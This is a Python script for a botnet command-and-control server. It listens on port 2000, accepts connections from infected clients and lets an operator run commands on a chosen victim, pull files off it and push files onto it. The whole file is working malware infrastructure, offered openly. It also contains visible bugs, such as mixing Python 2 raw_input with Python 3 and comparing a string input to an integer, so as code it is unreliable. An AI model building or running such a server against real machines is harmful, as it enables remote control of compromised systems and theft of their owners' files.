# CnC server

#!/usr/bin/env python3

import sys
import socket
from socket import AF_INET, SOCK_STREAM
from common import pr, clear, get_cipher
from common import Encode, Decode, Send, Receive

# server socket
server = socket.socket(AF_INET, SOCK_STREAM)
server.bind(('', 2000))
server.listen()

# client sockets
socks = []
clients = []
active = False

# server requires bot to send file
def download(sock, file):
  Send(sock, 'download ' + file)
  pr('Downloading ' + file)

  f = open(file, 'wb')
  d = Receive(sock)
  f.write(d)
  f.close()

# server requires bot to receive file
def upload(sock, file):
  Send(sock, 'upload ' + file)
  pr('Uploading ' + file)

  f = open(file, 'rb')
  d = f.read()
  Send(sock, d, '')
  f.close()

def close(sock, client):
  sock.close()
  socks.remove(sock)
  clients.remove(client)
  refresh()

def refresh():
  clear()
  pr('Listening for clients...')

  l = len(clients)

  if l == 0:
    pr('...')
    return

  for i in range(0, l):
    j = i + 1
    pr('Client %d: %s' % (j, clients[i]))

  pr('Press Ctrl+C to interact with client.')

while True:
  refresh()
  try:
    server.settimeout(10)

    try:
      s, a = server.accept()
    except socket.timeout:
      continue

    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))

    refresh()
  except KeyboardInterrupt:
    activate = input('Enter option: ')

    if activate == 0:
      pr('Exiting...')

      for i in range(0, len(socks)):
        socks[i].close()

      sys.exit()

    Send(socks[activate], 'activate')

    pr('Activating client %d: %s' % (activate, clients[activate]))

    activate -= 1
    cipher = get_cipher()
    active = True

  while active:
    sock = socks[activate]
    client = clients[activate]

    try:
      data = Receive(sock)
    except:
      active = False
      pr('Client %s disconnected.' % client)
      close(sock, client)
      break

    # client's respond msg to exit cmd
    if data == 'exit ok':
      active = False
      pr('Exit.')
      close(sock, client)
      break

    elif data != '':
      sys.stdout.write(data)
      nc = raw_input() # next cmd

      if nc.startswith('download '):
        download(sock, nc.split(' ')[1])

      elif nc.startswith('upload '):
        upload(sock, nc.split(' ')[1])

      elif nc != '':
        Send(sock, nc)
